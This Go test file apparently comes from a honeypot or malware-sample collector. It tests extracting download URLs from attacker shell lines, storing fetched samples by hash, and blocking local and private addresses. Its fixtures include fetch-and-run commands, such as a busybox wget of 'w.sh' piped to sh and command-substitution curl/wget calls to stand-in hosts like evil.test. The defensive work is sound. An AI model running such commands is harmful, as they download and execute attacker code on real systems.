package helpers

import (
	"errors"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func TestDownloadURL(t *testing.T) {
	cases := []struct {
		line, url string
		ok        bool
	}{
		{"wget http://evil.test/a", "http://evil.test/a", true},
		{"cd /tmp;/bin/busybox wget http://1.2.3.4:800/w.sh;sh w.sh", "http://1.2.3.4:800/w.sh", true},
		{"$(curl https://evil.test/b)", "https://evil.test/b", true},
		{"`wget http://evil.test/c`", "http://evil.test/c", true},
		{"echo http://evil.test/d", "", false},
		{"wget missing-url", "", false},
	}
	for _, tc := range cases {
		url, ok := DownloadURL(tc.line)
		require.Equal(t, tc.ok, ok, tc.line)
		require.Equal(t, tc.url, url, tc.line)
	}
}

func TestFetchSampleStores(t *testing.T) {
	t.Chdir(t.TempDir())
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("#!/bin/sh\necho sample\n"))
	}))
	defer ts.Close()

	hash, err := FetchSample(ts.Client(), ts.URL+"/w.sh")
	require.NoError(t, err)
	require.Equal(t, SHA256Hex([]byte("#!/bin/sh\necho sample\n")), hash)
	stored, err := os.ReadFile(filepath.Join("samples", hash))
	require.NoError(t, err)
	require.Equal(t, "#!/bin/sh\necho sample\n", string(stored))
}

func TestFetchSampleErrors(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/empty" {
			return
		}
		http.NotFound(w, r)
	}))
	defer ts.Close()

	_, err := FetchSample(ts.Client(), ts.URL+"/missing")
	require.ErrorContains(t, err, "404")
	_, err = FetchSample(ts.Client(), ts.URL+"/empty")
	require.ErrorContains(t, err, "empty")
}

func TestPublicSampleClientRefusesLocalAddresses(t *testing.T) {
	hit := false
	ts := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hit = true }))
	defer ts.Close()

	_, err := FetchSample(PublicSampleClient(time.Second), ts.URL+"/w.sh")
	require.True(t, errors.Is(err, ErrSampleAddress), "got %v", err)
	require.False(t, hit)
}

func TestPublicAddr(t *testing.T) {
	for addr, want := range map[string]bool{
		"8.8.8.8":          true,
		"202.110.70.60":    true,
		"2001:4860::8888":  true,
		"127.0.0.1":        false,
		"10.1.2.3":         false,
		"172.16.0.1":       false,
		"192.168.1.1":      false,
		"169.254.169.254":  false,
		"100.64.0.1":       false,
		"0.0.0.0":          false,
		"224.0.0.1":        false,
		"::1":              false,
		"fe80::1":          false,
		"fd00::1":          false,
		"::ffff:127.0.0.1": false,
	} {
		require.Equal(t, want, PublicAddr(netip.MustParseAddr(addr)), addr)
	}
}
